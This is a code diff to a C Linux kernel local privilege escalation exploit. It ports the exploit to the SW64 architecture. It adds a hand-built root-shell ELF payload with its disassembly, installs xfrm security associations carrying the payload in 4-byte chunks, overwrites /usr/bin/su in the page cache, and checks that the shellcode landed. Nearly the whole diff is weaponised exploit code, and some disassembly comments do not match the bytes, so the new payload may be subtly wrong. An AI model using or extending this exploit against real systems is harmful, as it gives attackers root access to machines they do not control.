@@ -36,8 +36,14 @@
 #define REPLAY_SEQ       100
 #define TARGET_PATH      "/usr/bin/su"
 #define PATCH_OFFSET     0              /* overwrite whole ELF starting at file[0] */
+
+#ifdef __sw_64__
+#define PAYLOAD_LEN      227            /* bytes of sw64_shell_elf to write */
+#define ENTRY_OFFSET     0x78           /* shellcode entry inside the new ELF */
+#else
 #define PAYLOAD_LEN      192            /* bytes of shell_elf to write (48 triggers) */
 #define ENTRY_OFFSET     0x78           /* shellcode entry inside the new ELF */
+#endif
 
 /*
  * 192-byte minimal x86_64 root-shell ELF.
@@ -85,6 +91,70 @@ static const uint8_t shell_elf[PAYLOAD_LEN] = {
 	0x6a,0x3b,0x58,0x0f,0x05,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,0x72,0x6d,0x00,
 	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
 };
+
+#ifdef __sw_64__
+/*
+ * 227-byte minimal sw_64 root-shell ELF.
+ *   Entry at 0x200000, code at file offset 0x78 (maps to vaddr 0x200078).
+ *   Machine: EM_SW64 (0x9916)
+ *   _start at 0x200078:
+ *     setgid(0); setuid(0); setgroups(0, NULL);
+ *     execve("/bin/sh", NULL, ["TERM=xterm", NULL]);
+ *   PT_LOAD covers 0xe3 bytes at vaddr 0x200000 R+X.
+ *
+ *   Setting TERM in the new shell's env silences the
+ *   "tput: No value for $TERM" / "test: : integer expected" noise
+ *   /etc/bash.bashrc and friends emit when TERM is unset.
+ *
+ * Disassembly (from offset 0x78):
+ *   84001ff8             ldi   v0, zr, 132     ; setgid syscall (132)
+ *   00001ffa             nop
+ *   83000002             syscall 0x83           ;
+ *   17001ff8             ldi   a0, zr, 0       ; gid = 0
+ *   00001ffa             nop
+ *   83000002             syscall 0x83           ;
+ *   50001ff8             ldi   v0, zr, 23      ; setuid syscall (23)
+ *   00001ffa             nop
+ *   00003ffa             nop
+ *   83000002             syscall 0x83           ;
+ *   3e01c64b             adr   sh, t0, t1       ; t0 = /bin/sh addr
+ *   1201c44b             addl  t0, 8, t1       ; t1 = TERM=xterm addr
+ *   00004010             nop
+ *   240022f8             stl   t1, sp, 0        ; envp[0] = TERM=xterm
+ *   02012148             ldi   v0, zr, 80      ; setgroups syscall (80)
+ *   00005eac             nop
+ *   0800feaf             addl  sp, 48, t0       ; t0 = sp + 48
+ *   3b001ff8             ldi   a1, zr, 0       ; size = 0
+ *   00003ffa             nop
+ *   83000002             syscall 0x83           ;
+ *   10012048             ldi   a0, zr, 0       ; list = NULL (a1 already 0)
+ *   00003ffa             nop
+ *   83000002             syscall 0x83           ; setgroups(0, NULL)
+ *   1e01c64b             addl  sp, 32, a2       ; a2 = sp+32 (envp ptr)
+ *   2f62696e             "/bin/sh\0" string     ; offset 0xd0
+ *   2f736800             ...
+ *   5445524d             "TERM=xterm" string   ; offset 0xd8
+ *   3d787465             ...
+ *   726d00               ...
+ */
+static const uint8_t sw64_shell_elf[227] = {
+	0x7f,0x45,0x4c,0x46,0x02,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x03,0x00,0x16,0x99,0x01,0x00,0x00,0x00,0x78,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x40,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x00,0x00,0x00,0x00,0x40,0x00,0x38,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x01,0x00,0x00,0x00,0x05,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0xe3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe3,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
+	0x00,0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x84,0x00,0x1f,0xf8,0x00,0x00,0x1f,0xfa,
+	0x83,0x00,0x00,0x02,0x17,0x00,0x1f,0xf8,0x00,0x00,0x1f,0xfa,0x83,0x00,0x00,0x02,
+	0x50,0x00,0x1f,0xf8,0x00,0x00,0x1f,0xfa,0x00,0x00,0x3f,0xfa,0x83,0x00,0x00,0x02,
+	0x3e,0x01,0xc6,0x4b,0x12,0x01,0xc4,0x4b,0x00,0x00,0x40,0x10,0x24,0x00,0x22,0xf8,
+	0x02,0x01,0x21,0x48,0x00,0x00,0x5e,0xac,0x08,0x00,0xfe,0xaf,0x3b,0x00,0x1f,0xf8,
+	0x10,0x01,0x20,0x48,0x00,0x00,0x3f,0xfa,0x83,0x00,0x00,0x02,0x1e,0x01,0xc6,0x4b,
+	0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x54,0x45,0x52,0x4d,0x3d,0x78,0x74,0x65,
+	0x72,0x6d,0x00,
+};
+#endif
 
 extern int g_su_verbose;
 int g_su_verbose = 0;
@@ -293,32 +363,39 @@ static int corrupt_su(void)
 	setup_userns_netns();
 	usleep(100 * 1000);
 
-	/* Install 40 xfrm SAs, one per 4-byte chunk.  Each carries the
+#ifdef __sw_64__
+	const uint8_t *payload = sw64_shell_elf;
+#else
+	const uint8_t *payload = shell_elf;
+#endif
+	size_t num_chunks = PAYLOAD_LEN / 4;
+
+	/* Install xfrm SAs, one per 4-byte chunk.  Each carries the
 	 * desired payload word in its seq_hi field. */
-	for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
+	for (size_t i = 0; i < num_chunks; i++) {
 		uint32_t spi = 0xDEADBE10 + i;
 		uint32_t seqhi =
-			((uint32_t)shell_elf[i*4 + 0] << 24) |
-			((uint32_t)shell_elf[i*4 + 1] << 16) |
-			((uint32_t)shell_elf[i*4 + 2] <<  8) |
-			((uint32_t)shell_elf[i*4 + 3]);
+			((uint32_t)payload[i*4 + 0] << 24) |
+			((uint32_t)payload[i*4 + 1] << 16) |
+			((uint32_t)payload[i*4 + 2] <<  8) |
+			((uint32_t)payload[i*4 + 3]);
 		if (add_xfrm_sa(spi, seqhi) < 0) {
-			SLOG("add_xfrm_sa #%d failed", i);
+			SLOG("add_xfrm_sa #%zu failed", i);
 			return -1;
 		}
 	}
-	SLOG("installed %d xfrm SAs", PAYLOAD_LEN / 4);
+	SLOG("installed %zu xfrm SAs", num_chunks);
 
-	for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
+	for (size_t i = 0; i < num_chunks; i++) {
 		uint32_t spi = 0xDEADBE10 + i;
 		off_t off = PATCH_OFFSET + i * 4;
 		if (do_one_write(TARGET_PATH, off, spi) < 0) {
-			SLOG("do_one_write #%d at off=0x%lx failed", i, (long)off);
+			SLOG("do_one_write #%zu at off=0x%lx failed", i, (long)off);
 			return -1;
 		}
 	}
-	SLOG("wrote %d bytes to %s starting at 0x%x",
-			PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
+	SLOG("wrote %zu bytes to %s starting at 0x%x",
+			(size_t)PAYLOAD_LEN, TARGET_PATH, PATCH_OFFSET);
 	return 0;
 }
 
@@ -346,13 +423,24 @@ int su_lpe_main(int argc, char **argv)
 	}
 
 	/* Sanity check: bytes at the embedded ELF entry (file offset 0x78
-	 * after our overwrite) should be 0x31 0xff (xor edi, edi — first
-	 * instruction of the new shellcode). */
-	if (verify_byte(TARGET_PATH, ENTRY_OFFSET, 0x31) != 0 ||
-			verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
+	 * after our overwrite). For x86_64: 0x31 0xff (xor edi, edi).
+	 * For SW64: 0x84 (first byte of ldi v0, zr, 132). */
+	if (verify_byte(TARGET_PATH, ENTRY_OFFSET,
+#ifdef __sw_64__
+			0x84
+#else
+			0x31
+#endif
+			) != 0) {
 		SLOG("post-write verify failed (target unchanged)");
 		return 1;
 	}
+#ifndef __sw_64__
+	if (verify_byte(TARGET_PATH, ENTRY_OFFSET + 1, 0xff) != 0) {
+		SLOG("post-write verify failed (target unchanged)");
+		return 1;
+	}
+#endif
 	SLOG("/usr/bin/su page-cache patched (entry 0x%x = shellcode)",
 			ENTRY_OFFSET);
 	return 0;
@@ -1689,10 +1777,6 @@ extern int rxrpc_lpe_main(int argc, char **argv);
  * (We don't check offset 0 because /usr/bin/su already has the ELF
  * magic there — both before and after we patch.)
  */
-static const uint8_t su_marker[8] = {
-	0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
-};
-
 static int su_already_patched(void)
 {
 	int fd = open("/usr/bin/su", O_RDONLY);
@@ -1703,6 +1787,15 @@ static int su_already_patched(void)
 	close(fd);
 	if (n != sizeof(got))
 		return 0;
+#ifdef __sw_64__
+	const uint8_t su_marker[8] = {
+		0x84, 0x00, 0x1f, 0xf8, 0x00, 0x00, 0x1f, 0xfa,
+	};
+#else
+	const uint8_t su_marker[8] = {
+		0x31, 0xff, 0x31, 0xf6, 0x31, 0xc0, 0xb0, 0x6a,
+	};
+#endif
 	return memcmp(got, su_marker, sizeof(su_marker)) == 0;
 }
 
